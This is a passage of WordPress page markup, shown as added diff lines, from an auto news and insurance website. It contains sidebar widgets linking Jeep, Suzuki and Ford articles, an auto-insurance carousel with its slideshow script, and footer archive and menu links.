+			<a href="http://www.todayautosonline.com/wrangler-pickup-returns-scrambler-name-to-jeep-lineup-report/" title="Permalink to Wrangler Pickup Returns ‘Scrambler’ Name to Jeep Lineup: Report" rel="bookmark"><img width="70" height="70" src="http://www.todayautosonline.com/wp-content/uploads/2017/08/f6024_Copyright-JLwranglerforums-JTU-Pickup-White-864x520-70x70.jpg" class="attachment-tie-small size-tie-small wp-post-image" alt="" srcset="http://www.todayautosonline.com/wp-content/uploads/2017/08/f6024_Copyright-JLwranglerforums-JTU-Pickup-White-864x520-70x70.jpg 70w, http://www.todayautosonline.com/wp-content/uploads/2017/08/f6024_Copyright-JLwranglerforums-JTU-Pickup-White-864x520-150x150.jpg 150w" sizes="(max-width: 70px) 100vw, 70px" /></a>
+		</div><!-- post-thumbnail /-->
+		<h3><a href="http://www.todayautosonline.com/wrangler-pickup-returns-scrambler-name-to-jeep-lineup-report/">Wrangler Pickup Returns ‘Scrambler’ Name to Jeep Lineup: Report</a></h3>
+	 <span class="date"><span class="tie-date">August 24, 2017</span></span>
+</li>
+<li>
+			<div class="post-thumbnail">
+			<a href="http://www.todayautosonline.com/great-wall-motors-does-want-jeep-hasnt-done-much-about-it/" title="Permalink to Great Wall Motors Does Want Jeep; Hasn’t Done Much About It" rel="bookmark"><img width="70" height="70" src="http://www.todayautosonline.com/wp-content/uploads/2017/08/fe5db_2017-Jeep-Compass-Trailhawk-70x70.jpg" class="attachment-tie-small size-tie-small wp-post-image" alt="" srcset="http://www.todayautosonline.com/wp-content/uploads/2017/08/fe5db_2017-Jeep-Compass-Trailhawk-70x70.jpg 70w, http://www.todayautosonline.com/wp-content/uploads/2017/08/fe5db_2017-Jeep-Compass-Trailhawk-150x150.jpg 150w" sizes="(max-width: 70px) 100vw, 70px" /></a>
+		</div><!-- post-thumbnail /-->
+		<h3><a href="http://www.todayautosonline.com/great-wall-motors-does-want-jeep-hasnt-done-much-about-it/">Great Wall Motors Does Want Jeep; Hasn’t Done Much About It</a></h3>
+	 <span class="date"><span class="tie-date">August 23, 2017</span></span>
+</li>
+<li>
+			<div class="post-thumbnail">
+			<a href="http://www.todayautosonline.com/chinas-great-wall-motors-co-completely-open-about-its-desire-to-purchase-jeep-but-not-fca/" title="Permalink to China’s Great Wall Motors Co. Completely Open About Its Desire to Purchase Jeep, But Not FCA" rel="bookmark"><img width="70" height="70" src="http://www.todayautosonline.com/wp-content/uploads/2017/08/78779_2017-Jeep-Grand-Cherokee-Great-Wall-logo-grille-70x70.jpg" class="attachment-tie-small size-tie-small wp-post-image" alt="" srcset="http://www.todayautosonline.com/wp-content/uploads/2017/08/78779_2017-Jeep-Grand-Cherokee-Great-Wall-logo-grille-70x70.jpg 70w, http://www.todayautosonline.com/wp-content/uploads/2017/08/78779_2017-Jeep-Grand-Cherokee-Great-Wall-logo-grille-150x150.jpg 150w" sizes="(max-width: 70px) 100vw, 70px" /></a>
+		</div><!-- post-thumbnail /-->
+		<h3><a href="http://www.todayautosonline.com/chinas-great-wall-motors-co-completely-open-about-its-desire-to-purchase-jeep-but-not-fca/">China’s Great Wall Motors Co. Completely Open About Its Desire to Purchase Jeep, But Not FCA</a></h3>
+	 <span class="date"><span class="tie-date">August 22, 2017</span></span>
+</li>
+	
+				</ul>
+		<div class="clear"></div>
+	</div></div><!-- .widget /--><div id="categort-posts-widget-5" class="widget categort-posts"><div class="widget-top"><h4>Suzuki		</h4><div class="stripe-line"></div></div>
+						<div class="widget-container">				<ul>
+					<li>
+			<div class="post-thumbnail">
+			<a href="http://www.todayautosonline.com/rare-rides-a-red-mostly-suzuki-crapwagon-collection-in-geo-form/" title="Permalink to Rare Rides: A Red (Mostly) Suzuki Crapwagon Collection, in Geo Form" rel="bookmark"><img width="70" height="70" src="http://www.todayautosonline.com/wp-content/uploads/2017/05/132f7_00y0y_5LzWgAejFXv_1200x900-70x70.jpg" class="attachment-tie-small size-tie-small wp-post-image" alt="" srcset="http://www.todayautosonline.com/wp-content/uploads/2017/05/132f7_00y0y_5LzWgAejFXv_1200x900-70x70.jpg 70w, http://www.todayautosonline.com/wp-content/uploads/2017/05/132f7_00y0y_5LzWgAejFXv_1200x900-150x150.jpg 150w" sizes="(max-width: 70px) 100vw, 70px" /></a>
+		</div><!-- post-thumbnail /-->
+		<h3><a href="http://www.todayautosonline.com/rare-rides-a-red-mostly-suzuki-crapwagon-collection-in-geo-form/">Rare Rides: A Red (Mostly) Suzuki Crapwagon Collection, in Geo Form</a></h3>
+	 <span class="date"><span class="tie-date">May 12, 2017</span></span>
+</li>
+<li>
+			<div class="post-thumbnail">
+			<a href="http://www.todayautosonline.com/junkyard-find-2004-suzuki-verona/" title="Permalink to Junkyard Find: 2004 Suzuki Verona" rel="bookmark"><img width="70" height="70" src="http://www.todayautosonline.com/wp-content/uploads/2016/11/0ebe5_00-2004-Suzuki-Verona-in-California-wrecking-yard-photo-by-Murilee-Martin-610x343-70x70.jpg" class="attachment-tie-small size-tie-small wp-post-image" alt="" srcset="http://www.todayautosonline.com/wp-content/uploads/2016/11/0ebe5_00-2004-Suzuki-Verona-in-California-wrecking-yard-photo-by-Murilee-Martin-610x343-70x70.jpg 70w, http://www.todayautosonline.com/wp-content/uploads/2016/11/0ebe5_00-2004-Suzuki-Verona-in-California-wrecking-yard-photo-by-Murilee-Martin-610x343-150x150.jpg 150w" sizes="(max-width: 70px) 100vw, 70px" /></a>
+		</div><!-- post-thumbnail /-->
+		<h3><a href="http://www.todayautosonline.com/junkyard-find-2004-suzuki-verona/">Junkyard Find: 2004 Suzuki Verona</a></h3>
+	 <span class="date"><span class="tie-date">November 28, 2016</span></span>
+</li>
+<li>
+			<div class="post-thumbnail">
+			<a href="http://www.todayautosonline.com/2006-suzuki-grand-vitara-review/" title="Permalink to 2006 Suzuki Grand Vitara Review" rel="bookmark"><img width="70" height="70" src="http://www.todayautosonline.com/wp-content/uploads/2016/10/40751_10_copy_15-70x70.jpg" class="attachment-tie-small size-tie-small wp-post-image" alt="" srcset="http://www.todayautosonline.com/wp-content/uploads/2016/10/40751_10_copy_15-70x70.jpg 70w, http://www.todayautosonline.com/wp-content/uploads/2016/10/40751_10_copy_15-150x150.jpg 150w" sizes="(max-width: 70px) 100vw, 70px" /></a>
+		</div><!-- post-thumbnail /-->
+		<h3><a href="http://www.todayautosonline.com/2006-suzuki-grand-vitara-review/">2006 Suzuki Grand Vitara Review</a></h3>
+	 <span class="date"><span class="tie-date">October 5, 2016</span></span>
+</li>
+<li>
+			<div class="post-thumbnail">
+			<a href="http://www.todayautosonline.com/review-2007-suzuki-sx4/" title="Permalink to Review: 2007 Suzuki SX4" rel="bookmark"><img width="70" height="70" src="http://www.todayautosonline.com/wp-content/uploads/2016/10/ffdd2_front2-70x70.jpg" class="attachment-tie-small size-tie-small wp-post-image" alt="" srcset="http://www.todayautosonline.com/wp-content/uploads/2016/10/ffdd2_front2-70x70.jpg 70w, http://www.todayautosonline.com/wp-content/uploads/2016/10/ffdd2_front2-150x150.jpg 150w" sizes="(max-width: 70px) 100vw, 70px" /></a>
+		</div><!-- post-thumbnail /-->
+		<h3><a href="http://www.todayautosonline.com/review-2007-suzuki-sx4/">Review: 2007 Suzuki SX4</a></h3>
+	 <span class="date"><span class="tie-date">October 5, 2016</span></span>
+</li>
+<li>
+			<div class="post-thumbnail">
+			<a href="http://www.todayautosonline.com/suzuki-xl7-review/" title="Permalink to Suzuki XL7 Review" rel="bookmark"><img width="70" height="70" src="http://www.todayautosonline.com/wp-content/uploads/2016/10/51e99_new-image-70x70.jpg" class="attachment-tie-small size-tie-small wp-post-image" alt="" srcset="http://www.todayautosonline.com/wp-content/uploads/2016/10/51e99_new-image-70x70.jpg 70w, http://www.todayautosonline.com/wp-content/uploads/2016/10/51e99_new-image-150x150.jpg 150w" sizes="(max-width: 70px) 100vw, 70px" /></a>
+		</div><!-- post-thumbnail /-->
+		<h3><a href="http://www.todayautosonline.com/suzuki-xl7-review/">Suzuki XL7 Review</a></h3>
+	 <span class="date"><span class="tie-date">October 5, 2016</span></span>
+</li>
+	
+				</ul>
+		<div class="clear"></div>
+	</div></div><!-- .widget /--><div id="categort-posts-widget-6" class="widget categort-posts"><div class="widget-top"><h4>Ford		</h4><div class="stripe-line"></div></div>
+						<div class="widget-container">				<ul>
+					<li>
+			<div class="post-thumbnail">
+			<a href="http://www.todayautosonline.com/the-ford-ranger-raptor-lives-packs-vastly-upgraded-suspension/" title="Permalink to The Ford Ranger Raptor Lives, Packs Vastly Upgraded Suspension" rel="bookmark"><img width="70" height="70" src="http://www.todayautosonline.com/wp-content/uploads/2017/09/6450f_ranger-Raptor-1-70x70.jpg" class="attachment-tie-small size-tie-small wp-post-image" alt="" srcset="http://www.todayautosonline.com/wp-content/uploads/2017/09/6450f_ranger-Raptor-1-70x70.jpg 70w, http://www.todayautosonline.com/wp-content/uploads/2017/09/6450f_ranger-Raptor-1-150x150.jpg 150w" sizes="(max-width: 70px) 100vw, 70px" /></a>
+		</div><!-- post-thumbnail /-->
+		<h3><a href="http://www.todayautosonline.com/the-ford-ranger-raptor-lives-packs-vastly-upgraded-suspension/">The Ford Ranger Raptor Lives, Packs Vastly Upgraded Suspension</a></h3>
+	 <span class="date"><span class="tie-date">September 8, 2017</span></span>
+</li>
+<li>
+			<div class="post-thumbnail">
+			<a href="http://www.todayautosonline.com/junkyard-find-1977-ford-pinto/" title="Permalink to Junkyard Find: 1977 Ford Pinto" rel="bookmark"><img width="70" height="42" src="http://www.todayautosonline.com/wp-content/uploads/2017/09/e6a47_00-1977-Ford-Pinto-in-Colorado-wrecking-yard-photo-by-Murilee-Martin-70x42.jpg" class="attachment-tie-small size-tie-small wp-post-image" alt="" /></a>
+		</div><!-- post-thumbnail /-->
+		<h3><a href="http://www.todayautosonline.com/junkyard-find-1977-ford-pinto/">Junkyard Find: 1977 Ford Pinto</a></h3>
+	 <span class="date"><span class="tie-date">September 6, 2017</span></span>
+</li>
+<li>
+			<div class="post-thumbnail">
+			<a href="http://www.todayautosonline.com/fords-autonomous-driving-effort-doesnt-end-at-pizza-delivery/" title="Permalink to Ford’s Autonomous Driving Effort Doesn’t End at Pizza Delivery" rel="bookmark"><img width="70" height="70" src="http://www.todayautosonline.com/wp-content/uploads/2017/09/71ced_1Y1A1721_HR-70x70.jpg" class="attachment-tie-small size-tie-small wp-post-image" alt="" srcset="http://www.todayautosonline.com/wp-content/uploads/2017/09/71ced_1Y1A1721_HR-70x70.jpg 70w, http://www.todayautosonline.com/wp-content/uploads/2017/09/71ced_1Y1A1721_HR-150x150.jpg 150w" sizes="(max-width: 70px) 100vw, 70px" /></a>
+		</div><!-- post-thumbnail /-->
+		<h3><a href="http://www.todayautosonline.com/fords-autonomous-driving-effort-doesnt-end-at-pizza-delivery/">Ford’s Autonomous Driving Effort Doesn’t End at Pizza Delivery</a></h3>
+	 <span class="date"><span class="tie-date">September 3, 2017</span></span>
+</li>
+<li>
+			<div class="post-thumbnail">
+			<a href="http://www.todayautosonline.com/despite-sharp-midsize-truck-decline-u-s-pickup-truck-sales-rose-4-percent-in-august-2017/" title="Permalink to Despite Sharp Midsize Truck Decline, U.S. Pickup Truck Sales Rose 4 Percent in August 2017" rel="bookmark"><img width="70" height="70" src="http://www.todayautosonline.com/wp-content/uploads/2017/09/f5935_2017-Nissan-Frontier-King-Cab-red-70x70.jpg" class="attachment-tie-small size-tie-small wp-post-image" alt="" srcset="http://www.todayautosonline.com/wp-content/uploads/2017/09/f5935_2017-Nissan-Frontier-King-Cab-red-70x70.jpg 70w, http://www.todayautosonline.com/wp-content/uploads/2017/09/f5935_2017-Nissan-Frontier-King-Cab-red-150x150.jpg 150w" sizes="(max-width: 70px) 100vw, 70px" /></a>
+		</div><!-- post-thumbnail /-->
+		<h3><a href="http://www.todayautosonline.com/despite-sharp-midsize-truck-decline-u-s-pickup-truck-sales-rose-4-percent-in-august-2017/">Despite Sharp Midsize Truck Decline, U.S. Pickup Truck Sales Rose 4 Percent in August 2017</a></h3>
+	 <span class="date"><span class="tie-date">September 2, 2017</span></span>
+</li>
+<li>
+			<div class="post-thumbnail">
+			<a href="http://www.todayautosonline.com/push-my-buttons-ford-files-patent-application-for-proximity-shifting/" title="Permalink to Push My Buttons: Ford Files Patent Application for ‘Proximity Shifting’" rel="bookmark"><img width="70" height="70" src="http://www.todayautosonline.com/wp-content/uploads/2017/09/909ff_Ford-Shifter-Main-70x70.jpg" class="attachment-tie-small size-tie-small wp-post-image" alt="" srcset="http://www.todayautosonline.com/wp-content/uploads/2017/09/909ff_Ford-Shifter-Main-70x70.jpg 70w, http://www.todayautosonline.com/wp-content/uploads/2017/09/909ff_Ford-Shifter-Main-150x150.jpg 150w" sizes="(max-width: 70px) 100vw, 70px" /></a>
+		</div><!-- post-thumbnail /-->
+		<h3><a href="http://www.todayautosonline.com/push-my-buttons-ford-files-patent-application-for-proximity-shifting/">Push My Buttons: Ford Files Patent Application for ‘Proximity Shifting’</a></h3>
+	 <span class="date"><span class="tie-date">September 2, 2017</span></span>
+</li>
+	
+				</ul>
+		<div class="clear"></div>
+	</div></div><!-- .widget /--></aside>
+<div class="clear"></div>
+		<section class="cat-box scroll-box scroll-box-wide tie-cat-2">
+			<h2 class="cat-box-title"><a href="http://www.todayautosonline.com/category/auto-insurance/">Auto Insurance</a></h2>
+
+			<div class="cat-box-content">
+
+								<div class="group_items-box" id="wslideshow2">
+									<div class="scroll-item">
+													<div class="post-thumbnail">
+								<a href="http://www.todayautosonline.com/follow-these-simple-ways-and-reduce-your-auto-insurance-premium/" title="Permalink to Follow These Simple Ways and Reduce Your Auto Insurance Premium" rel="bookmark">
+									<img width="260" height="160" src="http://www.todayautosonline.com/wp-content/uploads/2016/10/597630-4917-39-260x160.jpg" class="attachment-tie-large size-tie-large wp-post-image" alt="" />																	</a>
+							</div><!-- post-thumbnail /-->
+						
+						<h3 class="post-box-title"><a href="http://www.todayautosonline.com/follow-these-simple-ways-and-reduce-your-auto-insurance-premium/" title="Permalink to Follow These Simple Ways and Reduce Your Auto Insurance Premium" rel="bookmark">Follow These Simple Ways and Reduce Your Auto Insurance Premium</a></h3>
+						<p class="post-meta">
+							<span class="tie-date">October 5, 2016</span>						</p>
+					</div>
+									<div class="scroll-item">
+													<div class="post-thumbnail">
+								<a href="http://www.todayautosonline.com/8-vital-signs-that-tell-you-are-overpaying-for-your-auto-insurance/" title="Permalink to 8 Vital Signs That Tell You are Overpaying for Your Auto Insurance" rel="bookmark">
+									<img width="260" height="160" src="http://www.todayautosonline.com/wp-content/uploads/2016/10/597929-34418-44-260x160.jpg" class="attachment-tie-large size-tie-large wp-post-image" alt="" />																	</a>
+							</div><!-- post-thumbnail /-->
+						
+						<h3 class="post-box-title"><a href="http://www.todayautosonline.com/8-vital-signs-that-tell-you-are-overpaying-for-your-auto-insurance/" title="Permalink to 8 Vital Signs That Tell You are Overpaying for Your Auto Insurance" rel="bookmark">8 Vital Signs That Tell You are Overpaying for Your Auto Insurance</a></h3>
+						<p class="post-meta">
+							<span class="tie-date">October 5, 2016</span>						</p>
+					</div>
+									<div class="scroll-item">
+													<div class="post-thumbnail">
+								<a href="http://www.todayautosonline.com/difference-between-comprehensive-and-collision-auto-insurance-coverage/" title="Permalink to Difference Between Comprehensive and Collision Auto Insurance Coverage" rel="bookmark">
+									<img width="260" height="160" src="http://www.todayautosonline.com/wp-content/uploads/2016/10/604952-16112-8-260x160.jpg" class="attachment-tie-large size-tie-large wp-post-image" alt="" />																	</a>
+							</div><!-- post-thumbnail /-->
+						
+						<h3 class="post-box-title"><a href="http://www.todayautosonline.com/difference-between-comprehensive-and-collision-auto-insurance-coverage/" title="Permalink to Difference Between Comprehensive and Collision Auto Insurance Coverage" rel="bookmark">Difference Between Comprehensive and Collision Auto Insurance Coverage</a></h3>
+						<p class="post-meta">
+							<span class="tie-date">October 5, 2016</span>						</p>
+					</div>
+									<div class="scroll-item">
+													<div class="post-thumbnail">
+								<a href="http://www.todayautosonline.com/how-to-find-the-cheapest-full-coverage-motorcycle-insurance/" title="Permalink to How to Find the Cheapest Full Coverage Motorcycle Insurance" rel="bookmark">
+									<img width="260" height="160" src="http://www.todayautosonline.com/wp-content/uploads/2016/10/482642-2769-57-260x160.jpg" class="attachment-tie-large size-tie-large wp-post-image" alt="" />																	</a>
+							</div><!-- post-thumbnail /-->
+						
+						<h3 class="post-box-title"><a href="http://www.todayautosonline.com/how-to-find-the-cheapest-full-coverage-motorcycle-insurance/" title="Permalink to How to Find the Cheapest Full Coverage Motorcycle Insurance" rel="bookmark">How to Find the Cheapest Full Coverage Motorcycle Insurance</a></h3>
+						<p class="post-meta">
+							<span class="tie-date">October 5, 2016</span>						</p>
+					</div>
+									<div class="scroll-item">
+													<div class="post-thumbnail">
+								<a href="http://www.todayautosonline.com/how-to-choose-the-best-rv-insurance-plan/" title="Permalink to How to Choose the Best RV Insurance Plan" rel="bookmark">
+									<img width="260" height="160" src="http://www.todayautosonline.com/wp-content/uploads/2016/10/602783-39424-0-260x160.jpg" class="attachment-tie-large size-tie-large wp-post-image" alt="" />																	</a>
+							</div><!-- post-thumbnail /-->
+						
+						<h3 class="post-box-title"><a href="http://www.todayautosonline.com/how-to-choose-the-best-rv-insurance-plan/" title="Permalink to How to Choose the Best RV Insurance Plan" rel="bookmark">How to Choose the Best RV Insurance Plan</a></h3>
+						<p class="post-meta">
+							<span class="tie-date">October 5, 2016</span>						</p>
+					</div>
+									<div class="scroll-item">
+													<div class="post-thumbnail">
+								<a href="http://www.todayautosonline.com/how-do-auto-insurance-companies-determine-your-insurance-rates/" title="Permalink to How Do Auto Insurance Companies Determine Your Insurance Rates?" rel="bookmark">
+									<img width="260" height="160" src="http://www.todayautosonline.com/wp-content/uploads/2016/10/596205-4494-17-260x160.jpg" class="attachment-tie-large size-tie-large wp-post-image" alt="" />																	</a>
+							</div><!-- post-thumbnail /-->
+						
+						<h3 class="post-box-title"><a href="http://www.todayautosonline.com/how-do-auto-insurance-companies-determine-your-insurance-rates/" title="Permalink to How Do Auto Insurance Companies Determine Your Insurance Rates?" rel="bookmark">How Do Auto Insurance Companies Determine Your Insurance Rates?</a></h3>
+						<p class="post-meta">
+							<span class="tie-date">October 5, 2016</span>						</p>
+					</div>
+									<div class="scroll-item">
+													<div class="post-thumbnail">
+								<a href="http://www.todayautosonline.com/top-10-auto-insurance-companies-in-the-us/" title="Permalink to Top 10 Auto Insurance Companies in the US" rel="bookmark">
+									<img width="260" height="160" src="http://www.todayautosonline.com/wp-content/uploads/2016/10/440085-1821-58-260x160.jpg" class="attachment-tie-large size-tie-large wp-post-image" alt="" />																	</a>
+							</div><!-- post-thumbnail /-->
+						
+						<h3 class="post-box-title"><a href="http://www.todayautosonline.com/top-10-auto-insurance-companies-in-the-us/" title="Permalink to Top 10 Auto Insurance Companies in the US" rel="bookmark">Top 10 Auto Insurance Companies in the US</a></h3>
+						<p class="post-meta">
+							<span class="tie-date">October 5, 2016</span>						</p>
+					</div>
+									<div class="scroll-item">
+													<div class="post-thumbnail">
+								<a href="http://www.todayautosonline.com/cheap-full-coverage-auto-insurance/" title="Permalink to Cheap Full Coverage Auto Insurance" rel="bookmark">
+									<img width="260" height="160" src="http://www.todayautosonline.com/wp-content/uploads/2016/10/419635-7428-21-260x160.jpg" class="attachment-tie-large size-tie-large wp-post-image" alt="" />																	</a>
+							</div><!-- post-thumbnail /-->
+						
+						<h3 class="post-box-title"><a href="http://www.todayautosonline.com/cheap-full-coverage-auto-insurance/" title="Permalink to Cheap Full Coverage Auto Insurance" rel="bookmark">Cheap Full Coverage Auto Insurance</a></h3>
+						<p class="post-meta">
+							<span class="tie-date">October 5, 2016</span>						</p>
+					</div>
+									<div class="scroll-item">
+													<div class="post-thumbnail">
+								<a href="http://www.todayautosonline.com/van-insurance-tips/" title="Permalink to Van Insurance Tips" rel="bookmark">
+									<img width="260" height="160" src="http://www.todayautosonline.com/wp-content/uploads/2016/10/554300-51418-41-260x160.jpg" class="attachment-tie-large size-tie-large wp-post-image" alt="" />																	</a>
+							</div><!-- post-thumbnail /-->
+						
+						<h3 class="post-box-title"><a href="http://www.todayautosonline.com/van-insurance-tips/" title="Permalink to Van Insurance Tips" rel="bookmark">Van Insurance Tips</a></h3>
+						<p class="post-meta">
+							<span class="tie-date">October 5, 2016</span>						</p>
+					</div>
+									<div class="scroll-item">
+													<div class="post-thumbnail">
+								<a href="http://www.todayautosonline.com/how-much-does-tow-truck-insurance-cost/" title="Permalink to How much does Tow Truck Insurance Cost" rel="bookmark">
+									<img width="260" height="160" src="http://www.todayautosonline.com/wp-content/uploads/2016/10/554095-20727-49-260x160.jpg" class="attachment-tie-large size-tie-large wp-post-image" alt="" />																	</a>
+							</div><!-- post-thumbnail /-->
+						
+						<h3 class="post-box-title"><a href="http://www.todayautosonline.com/how-much-does-tow-truck-insurance-cost/" title="Permalink to How much does Tow Truck Insurance Cost" rel="bookmark">How much does Tow Truck Insurance Cost</a></h3>
+						<p class="post-meta">
+							<span class="tie-date">October 5, 2016</span>						</p>
+					</div>
+									<div class="scroll-item">
+													<div class="post-thumbnail">
+								<a href="http://www.todayautosonline.com/what-is-uninsured-motorist-coverage/" title="Permalink to What is Uninsured Motorist Coverage?" rel="bookmark">
+									<img width="260" height="160" src="http://www.todayautosonline.com/wp-content/uploads/2016/10/544141-56419-52-260x160.jpg" class="attachment-tie-large size-tie-large wp-post-image" alt="" />																	</a>
+							</div><!-- post-thumbnail /-->
+						
+						<h3 class="post-box-title"><a href="http://www.todayautosonline.com/what-is-uninsured-motorist-coverage/" title="Permalink to What is Uninsured Motorist Coverage?" rel="bookmark">What is Uninsured Motorist Coverage?</a></h3>
+						<p class="post-meta">
+							<span class="tie-date">October 5, 2016</span>						</p>
+					</div>
+									<div class="scroll-item">
+													<div class="post-thumbnail">
+								<a href="http://www.todayautosonline.com/difference-between-liability-and-full-coverage-insurance/" title="Permalink to Difference Between Liability and Full Coverage Insurance" rel="bookmark">
+									<img width="260" height="160" src="http://www.todayautosonline.com/wp-content/uploads/2016/10/539771-28722-34-260x160.jpg" class="attachment-tie-large size-tie-large wp-post-image" alt="" />																	</a>
+							</div><!-- post-thumbnail /-->
+						
+						<h3 class="post-box-title"><a href="http://www.todayautosonline.com/difference-between-liability-and-full-coverage-insurance/" title="Permalink to Difference Between Liability and Full Coverage Insurance" rel="bookmark">Difference Between Liability and Full Coverage Insurance</a></h3>
+						<p class="post-meta">
+							<span class="tie-date">October 5, 2016</span>						</p>
+					</div>
+								<div class="clear"></div>
+				</div>
+				<div class="scroll-nav"><a id="nextw2" href="#"><i class="tieicon-right-open"></i></a><a class="prev-scroll" id="prevw2" href="#"><i class="tieicon-left-open"></i></a></div>
+							</div><!-- .cat-box-content /-->
+		</section>
+		<div class="clear"></div>
+
+
+<script type="text/javascript">
+	jQuery(document).ready(function() {
+		var vids = jQuery("#wslideshow2 .scroll-item");
+		for(var i = 0; i < vids.length; i+=4) {
+		  vids.slice(i, i+4).wrapAll('<div class="group_items"></div>');
+		}
+		jQuery(function() {
+			jQuery('#wslideshow2').cycle({
+				fx:     'scrollHorz',
+				timeout: 3000,
+				//pager:  '#nav2',
+				slideExpr: '.group_items',
+				prev:   '#prevw2',
+				next:   '#nextw2',
+				speed: 300,
+				pause: true
+			});
+		});
+  });
+</script>
+
+	
+
+		<div class="clear"></div>
+	</div><!-- .container /-->
+
+		</div><!-- .container -->
+
+	<footer class="fade-in animated4">
+	<div id="footer-widget-area" class="footer-3c container">
+
+			<div id="footer-first" class="footer-widgets-box">
+			<div id="archives-2" class="footer-widget widget_archive"><div class="footer-widget-top"><h4>Archives</h4></div>
+						<div class="footer-widget-container">		<ul>
+			<li><a href='http://www.todayautosonline.com/2017/09/'>September 2017</a>&nbsp;(63)</li>
+	<li><a href='http://www.todayautosonline.com/2017/08/'>August 2017</a>&nbsp;(188)</li>
+	<li><a href='http://www.todayautosonline.com/2017/07/'>July 2017</a>&nbsp;(200)</li>
+	<li><a href='http://www.todayautosonline.com/2017/06/'>June 2017</a>&nbsp;(194)</li>
+	<li><a href='http://www.todayautosonline.com/2017/05/'>May 2017</a>&nbsp;(170)</li>
+	<li><a href='http://www.todayautosonline.com/2017/04/'>April 2017</a>&nbsp;(156)</li>
+	<li><a href='http://www.todayautosonline.com/2017/03/'>March 2017</a>&nbsp;(204)</li>
+	<li><a href='http://www.todayautosonline.com/2017/02/'>February 2017</a>&nbsp;(168)</li>
+	<li><a href='http://www.todayautosonline.com/2017/01/'>January 2017</a>&nbsp;(190)</li>
+	<li><a href='http://www.todayautosonline.com/2016/12/'>December 2016</a>&nbsp;(402)</li>
+	<li><a href='http://www.todayautosonline.com/2016/11/'>November 2016</a>&nbsp;(200)</li>
+	<li><a href='http://www.todayautosonline.com/2016/10/'>October 2016</a>&nbsp;(1041)</li>
+		</ul>
+		</div></div><!-- .widget /-->		</div>
+	
+			<div id="footer-second" class="footer-widgets-box">
+			<div id="nav_menu-2" class="footer-widget widget_nav_menu"><div class="footer-widget-top"><h4> </h4></div>
+						<div class="footer-widget-container"><div class="menu-top-container"><ul id="menu-top-1" class="menu"><li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1654"><a href="http://www.todayautosonline.com/category/auto-insurance/">Auto Insurance</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1655"><a href="http://www.todayautosonline.com/category/car-buying/">Car Buying</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1656"><a href="http://www.todayautosonline.com/category/car-loans/">Car Loans</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1755"><a href="http://www.todayautosonline.com/contact-us/">Contact us</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1756"><a href="http://www.todayautosonline.com/privacy-policy/">Privacy Policy</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1757"><a href="http://www.todayautosonline.com/affiliate-disclosure/">Affiliate Disclosure</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1758"><a href="http://www.todayautosonline.com/dmca/">DMCA</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1759"><a href="http://www.todayautosonline.com/terms-of-use/">Terms Of Use</a></li>
+</ul></div></div></div><!-- .widget /-->		</div><!-- #second .widget-area -->
+	
+
+			<div id="footer-third" class="footer-widgets-box">
+			<div id="text-9" class="footer-widget widget_text"><div class="footer-widget-top"><h4> </h4></div>
+						<div class="footer-widget-container">			<div class="textwidget"></div>
+		</div></div><!-- .widget /--><div id="categort-posts-widget-7" class="footer-widget categort-posts"><div class="footer-widget-top"><h4>Category Posts		</h4></div>
+						<div class="footer-widget-container">				<ul>
+					<li>
+			<div class="post-thumbnail">
+			<a href="http://www.todayautosonline.com/rare-rides-the-1990-bentley-hooper-empress-ii-a-turbo-r-by-any-other-name/" title="Permalink to Rare Rides: The 1990 Bentley Hooper Empress II – a Turbo R by Any Other Name" rel="bookmark"><img width="70" height="70" src="http://www.todayautosonline.com/wp-content/uploads/2017/08/5f962_00C0C_dhSLafWwGZB_1200x900-70x70.jpg" class="attachment-tie-small size-tie-small wp-post-image" alt="" srcset="http://www.todayautosonline.com/wp-content/uploads/2017/08/5f962_00C0C_dhSLafWwGZB_1200x900-70x70.jpg 70w, http://www.todayautosonline.com/wp-content/uploads/2017/08/5f962_00C0C_dhSLafWwGZB_1200x900-150x150.jpg 150w" sizes="(max-width: 70px) 100vw, 70px" /></a>
+		</div><!-- post-thumbnail /-->
+		<h3><a href="http://www.todayautosonline.com/rare-rides-the-1990-bentley-hooper-empress-ii-a-turbo-r-by-any-other-name/">Rare Rides: The 1990 Bentley Hooper Empress II – a Turbo R by Any Other Name</a></h3>
+	 <span class="date"><span class="tie-date">August 12, 2017</span></span>
+</li>
+<li>
+			<div class="post-thumbnail">
+			<a href="http://www.todayautosonline.com/rare-rides-the-rolls-royce-sweptail-a-bespoke-ultra-luxury-coupe/" title="Permalink to Rare Rides: The Rolls-Royce Sweptail, a Bespoke Ultra-Luxury Coupe" rel="bookmark"><img width="70" height="70" src="http://www.todayautosonline.com/wp-content/uploads/2017/06/86b45_P90261371_highRes_rolls-royce-sweptail-610x407-70x70.jpg" class="attachment-tie-small size-tie-small wp-post-image" alt="" srcset="http://www.todayautosonline.com/wp-content/uploads/2017/06/86b45_P90261371_highRes_rolls-royce-sweptail-610x407-70x70.jpg 70w, http://www.todayautosonline.com/wp-content/uploads/2017/06/86b45_P90261371_highRes_rolls-royce-sweptail-610x407-150x150.jpg 150w" sizes="(max-width: 70px) 100vw, 70px" /></a>
+		</div><!-- post-thumbnail /-->
+		<h3><a href="http://www.todayautosonline.com/rare-rides-the-rolls-royce-sweptail-a-bespoke-ultra-luxury-coupe/">Rare Rides: The Rolls-Royce Sweptail, a Bespoke Ultra-Luxury Coupe</a></h3>
+	 <span class="date"><span class="tie-date">June 16, 2017</span></span>
+</li>
+<li>
+			<div class="post-thumbnail">
+			<a href="http://www.todayautosonline.com/parked-in-drive-1936-rolls-royce-2025-sedanca-de-ville/" title="Permalink to Parked In Drive: 1936 Rolls-Royce 20/25 Sedanca de Ville" rel="bookmark"><img width="70" height="70" src="http://www.todayautosonline.com/wp-content/uploads/2017/05/1c4e0_Rolls1-610x407-70x70.jpg" class="attachment-tie-small size-tie-small wp-post-image" alt="" srcset="http://www.todayautosonline.com/wp-content/uploads/2017/05/1c4e0_Rolls1-610x407-70x70.jpg 70w, http://www.todayautosonline.com/wp-content/uploads/2017/05/1c4e0_Rolls1-610x407-150x150.jpg 150w" sizes="(max-width: 70px) 100vw, 70px" /></a>
+		</div><!-- post-thumbnail /-->
